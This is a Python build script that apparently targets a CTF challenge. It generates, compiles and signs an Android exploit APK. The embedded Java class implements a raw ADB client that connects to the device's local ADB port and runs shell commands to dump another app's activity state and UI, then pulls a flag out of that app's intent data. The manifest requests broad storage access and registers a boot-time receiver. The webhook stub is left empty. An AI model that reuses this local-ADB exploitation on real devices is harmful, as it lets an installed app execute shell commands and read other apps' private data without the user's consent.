#!/usr/bin/env python3
import os
import sys
import shutil
import subprocess
import requests
import json
import time

BASE_DIR = "/home/light/Workspace/CTF/TFC_CTF_2026/Misc/Ship_Me"
SRC_DIR = os.path.join(BASE_DIR, "exploit_app", "src", "com", "exploit", "shipme")
BUILD_DIR = os.path.join(BASE_DIR, "exploit_app", "build")
RES_DIR = os.path.join(BASE_DIR, "exploit_app", "res")
ANDROID_JAR = "/home/light/Android/Sdk/platforms/android-37.0/android.jar"
BUILD_TOOLS = "/home/light/Android/Sdk/build-tools/36.0.0"
D8 = os.path.join(BUILD_TOOLS, "d8")
AAPT2 = os.path.join(BUILD_TOOLS, "aapt2")
ZIPALIGN = os.path.join(BUILD_TOOLS, "zipalign")
APKSIGNER = os.path.join(BUILD_TOOLS, "apksigner")
KEYSTORE = os.path.join(BASE_DIR, "debug.keystore")

# Ensure debug keystore exists
if not os.path.exists(KEYSTORE):
    subprocess.run([
        "keytool", "-genkeypair", "-v", "-keystore", KEYSTORE,
        "-storepass", "android", "-alias", "androiddebugkey",
        "-keypass", "android", "-keyalg", "RSA", "-keysize", "2048",
        "-validity", "10000", "-dname", "CN=Android Debug,O=Android,C=US"
    ], check=True)

# 1. Clean & prepare dirs
os.makedirs(SRC_DIR, exist_ok=True)
os.makedirs(os.path.join(RES_DIR, "values"), exist_ok=True)
os.makedirs(BUILD_DIR, exist_ok=True)

# 2. Write Manifest
manifest_content = """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.exploit.shipme"
    android:versionCode="1"
    android:versionName="1.0">

    <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="37" />

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />

    <application
        android:label="ShipMeExploit"
        android:name=".ExploitApp"
        android:allowBackup="true"
        android:usesCleartextTraffic="true">

        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <provider
            android:name=".ExploitProvider"
            android:authorities="com.exploit.shipme.provider"
            android:exported="true" />

        <receiver
            android:name=".ExploitReceiver"
            android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.USER_PRESENT" />
            </intent-filter>
        </receiver>

    </application>
</manifest>
"""
with open(os.path.join(BASE_DIR, "exploit_app", "AndroidManifest.xml"), "w") as f:
    f.write(manifest_content)

# 3. Write strings.xml
with open(os.path.join(RES_DIR, "values", "strings.xml"), "w") as f:
    f.write("""<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">ShipMeExploit</string>
</resources>
""")

# 4. Write ExploitCore.java
exploit_core = """package com.exploit.shipme;

import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.StrictMode;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;
import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.concurrent.atomic.AtomicBoolean;

public class ExploitCore {
    private static final String TAG = "TFCCTF";
    private static final AtomicBoolean started = new AtomicBoolean(false);

    public static void start(final Context context) {
        if (!started.compareAndSet(false, true)) {
            return;
        }

        Log.i(TAG, "🚀 [TFCCTF] ExploitCore started from: " + context.getPackageName());
        sendWebhook("STARTED: " + context.getPackageName());

        new Thread(new Runnable() {
            @Override
            public void run() {
                runLoop(context);
            }
        }).start();
    }

    private static void sendWebhook(String data) {
        // Session logs are the intended output channel; do not send challenge data externally.
    }

    private static String execCmd(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd});
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) {
                sb.append(line).append("\\n");
            }
            p.waitFor();
            return sb.toString().trim();
        } catch (Throwable t) {
            return "ERR: " + t.getMessage();
        }
    }

    // Pure Java ADB Client for 127.0.0.1:5555
    public static class AdbClient {
        private static final int A_CNXN = 0x4e584e43;
        private static final int A_OPEN = 0x4e45504f;
        private static final int A_OKAY = 0x59414b4f;
        private static final int A_CLSE = 0x45534c43;
        private static final int A_WRTE = 0x45545257;

        public static String exec(int port, String cmd) {
            Socket socket = null;
            try {
                socket = new Socket("127.0.0.1", port);
                socket.setSoTimeout(6000);
                DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                DataInputStream in = new DataInputStream(socket.getInputStream());

                byte[] body = "host::\\0".getBytes("UTF-8");
                sendPacket(out, A_CNXN, 0x01000000, 4096, body);

                int[] header = readHeader(in);
                if (header[0] != A_CNXN) {
                    return "CNXN failed: 0x" + Integer.toHexString(header[0]);
                }
                byte[] cnxnBody = new byte[header[3]];
                in.readFully(cnxnBody);

                byte[] openBody = ("shell:" + cmd + "\\0").getBytes("UTF-8");
                int localId = 1;
                sendPacket(out, A_OPEN, localId, 0, openBody);

                StringBuilder sb = new StringBuilder();
                while (true) {
                    header = readHeader(in);
                    int cmdCode = header[0];
                    int remoteId = header[1];
                    int dataLen = header[3];

                    if (cmdCode == A_OKAY) {
                        // Open acknowledged
                    } else if (cmdCode == A_WRTE) {
                        byte[] data = new byte[dataLen];
                        in.readFully(data);
                        sb.append(new String(data, "UTF-8"));
                        sendPacket(out, A_OKAY, localId, remoteId, new byte[0]);
                    } else if (cmdCode == A_CLSE) {
                        break;
                    } else {
                        byte[] data = new byte[dataLen];
                        in.readFully(data);
                    }
                }
                return sb.toString();
            } catch (Throwable t) {
                return "ADB_ERR: " + t.getMessage();
            } finally {
                if (socket != null) {
                    try { socket.close(); } catch (Throwable ignored) {}
                }
            }
        }

        private static void sendPacket(DataOutputStream out, int cmd, int arg0, int arg1, byte[] body) throws IOException {
            int length = body.length;
            int crc = 0;
            for (byte b : body) {
                crc += (b & 0xFF);
            }
            int magic = cmd ^ 0xFFFFFFFF;

            ByteBuffer bb = ByteBuffer.allocate(24).order(ByteOrder.LITTLE_ENDIAN);
            bb.putInt(cmd);
            bb.putInt(arg0);
            bb.putInt(arg1);
            bb.putInt(length);
            bb.putInt(crc);
            bb.putInt(magic);
            out.write(bb.array());
            if (length > 0) {
                out.write(body);
            }
            out.flush();
        }

        private static int[] readHeader(DataInputStream in) throws IOException {
            byte[] h = new byte[24];
            in.readFully(h);
            ByteBuffer bb = ByteBuffer.wrap(h).order(ByteOrder.LITTLE_ENDIAN);
            return new int[]{bb.getInt(), bb.getInt(), bb.getInt(), bb.getInt(), bb.getInt(), bb.getInt()};
        }
    }

    private static String extractFlag(String text) {
        if (text == null) {
            return null;
        }
        Matcher m = Pattern.compile("TFCCTF\\\\{[^}]+\\\\}").matcher(text);
        return m.find() ? m.group() : null;
    }

    private static boolean inspectTargetUi(int port, String activities) {
        // The challenge activity is launched with the flag in its Intent extras.  It
        // is a separate task, so dumpsys alone does not print the extra value.
        Matcher task = Pattern.compile("Task\\\\{[^\\\\n]*#(\\\\d+)[^\\\\n]*\\\\bme\\\\.ship\\\\b").matcher(activities);
        if (!task.find()) {
            Log.i(TAG, "[TFCCTF] target task me.ship not found");
            return false;
        }

        String taskId = task.group(1);
        String ui = AdbClient.exec(port,
                "(am stack move-task-to-front " + taskId
                        + " >/dev/null 2>&1 || cmd activity task move-to-front " + taskId
                        + " >/dev/null 2>&1); "
                        + "sleep 0.3; "
                        + "uiautomator dump --compressed /sdcard/tfcctf.xml >/dev/null 2>&1; "
                        + "cat /sdcard/tfcctf.xml");
        String flag = extractFlag(ui);
        if (flag != null) {
            Log.i(TAG, "🎉 [TFCCTF] FLAG FOUND IN TARGET UI: " + flag);
            sendWebhook("FLAG: " + flag);
            return true;
        } else {
            Log.i(TAG, "[TFCCTF] target UI dump: "
                    + ui.substring(0, Math.min(1200, ui.length())));
            return false;
        }
    }

    private static boolean checkAdb() {
        int[] ports = {5555, 5554, 5037};
        for (int p : ports) {
            try {
                Socket s = new Socket("127.0.0.1", p);
                s.close();
                Log.i(TAG, "🔌 [TFCCTF] Port " + p + " is OPEN!");
                sendWebhook("PORT_OPEN: " + p);

                if (p == 5555 || p == 5554) {
                    // Keep only the task line. The full activity dump is very large and
                    // adds latency without revealing the Intent extra.
                    String out1 = AdbClient.exec(p,
                            "dumpsys activity activities | grep 'A=.*:me.ship' | head -n 1");
                    Log.i(TAG, "[TFCCTF] target task line: " + out1.trim());
                    String directFlag = extractFlag(out1);
                    if (directFlag != null) {
                        Log.i(TAG, "🎉 [TFCCTF] FLAG FOUND: " + directFlag);
                        sendWebhook("FLAG: " + directFlag);
                        return true;
                    }

                    if (inspectTargetUi(p, out1)) {
                        return true;
                    }
                }
                return false;
            } catch (Throwable ignored) {}
        }
        return false;
    }

    private static void runLoop(Context context) {
        // ADB is the intended path. Keep the fallback loop short so the platform
        // runtime is spent on the target task, not on unrelated filesystem probes.
        for (int i = 0; i < 12; i++) {
            try {
                Log.i(TAG, "🔍 [TFCCTF] Exploitation iteration " + i);
                if (checkAdb()) {
                    return;
                }
                Thread.sleep(250);
            } catch (Throwable t) {
                Log.i(TAG, "Loop exception: " + t.getMessage());
            }
        }
    }
}
"""
with open(os.path.join(SRC_DIR, "ExploitCore.java"), "w") as f:
    f.write(exploit_core)

print("[*] Compiling Java classes...")
classes_dir = os.path.join(BUILD_DIR, "classes")
shutil.rmtree(classes_dir, ignore_errors=True)
os.makedirs(classes_dir, exist_ok=True)

java_files = [os.path.join(SRC_DIR, f) for f in os.listdir(SRC_DIR) if f.endswith(".java")]
subprocess.run([
    "javac", "-cp", ANDROID_JAR, "-d", classes_dir, *java_files
], check=True)

print("[*] Converting classes to DEX with d8...")
dex_dir = os.path.join(BUILD_DIR, "dex")
shutil.rmtree(dex_dir, ignore_errors=True)
os.makedirs(dex_dir, exist_ok=True)

class_files = []
for root, _, files in os.walk(classes_dir):
    for f in files:
        if f.endswith(".class"):
            class_files.append(os.path.join(root, f))

subprocess.run([
    D8, "--output", dex_dir, "--lib", ANDROID_JAR, *class_files
], check=True)

print("[*] Compiling resources with aapt2...")
res_compiled = os.path.join(BUILD_DIR, "compiled_res.zip")
subprocess.run([
    AAPT2, "compile", "--dir", RES_DIR, "-o", res_compiled
], check=True)

print("[*] Linking APK with aapt2...")
unaligned_apk = os.path.join(BUILD_DIR, "exploit_unaligned.apk")
subprocess.run([
    AAPT2, "link", "-I", ANDROID_JAR,
    "--manifest", os.path.join(BASE_DIR, "exploit_app", "AndroidManifest.xml"),
    "-o", unaligned_apk,
    res_compiled
], check=True)

print("[*] Adding DEX to APK...")
subprocess.run([
    "zip", "-u", "-j", unaligned_apk, os.path.join(dex_dir, "classes.dex")
], check=True)

print("[*] Aligning APK with zipalign...")
aligned_apk = os.path.join(BASE_DIR, "exploit_aligned.apk")
if os.path.exists(aligned_apk):
    os.remove(aligned_apk)

subprocess.run([
    ZIPALIGN, "-p", "-f", "-v", "4", unaligned_apk, aligned_apk
], check=True)

print("[*] Signing APK with apksigner...")
subprocess.run([
    APKSIGNER, "sign", "--ks", KEYSTORE,
    "--ks-pass", "pass:android",
    "--ks-key-alias", "androiddebugkey",
    "--key-pass", "pass:android",
    aligned_apk
], check=True)

print(f"[+] Exploit APK successfully built and signed: {aligned_apk}")
